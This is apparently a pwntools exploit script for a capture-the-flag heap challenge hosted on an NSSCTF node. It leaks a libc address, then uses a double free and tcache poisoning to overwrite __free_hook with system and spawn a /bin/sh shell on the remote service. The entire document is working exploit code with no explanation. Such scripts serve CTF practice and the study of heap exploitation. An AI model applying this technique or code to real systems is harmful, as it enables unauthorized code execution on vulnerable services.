from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote(b"node3.anna.nssctf.cn",28740)
# io=process("./vuln")
libc=ELF("./libc-2.31.so")

def add(n,s,cc):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"Index: ",str(n))
    io.sendlineafter(b"Size: ",str(s))
    io.sendafter(b"Content: ",cc)

def delete(n):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"Index: ",str(n))

def show(n):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"Index: ",str(n))
        
# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x90,b"/bin/sh")

add(8,0x90,b"/bin/sh")
add(9,0x90,b"/bin/sh")
add(10,0x10,b"/bin/sh")

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x60-0x1ECB80
print("leak_addr: "+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b"system"]
free_hook=leak_addr+libc.sym[b"__free_hook"]

delete(8)

add(11,0x90,b"/bin/sh")

delete(8)

add(12,0xc0,cyclic(0xa0)+p64(free_hook))
add(13,0x90,b"qqq")
add(14,0x90,p64(sys_addr))

delete(11)

io.interactive()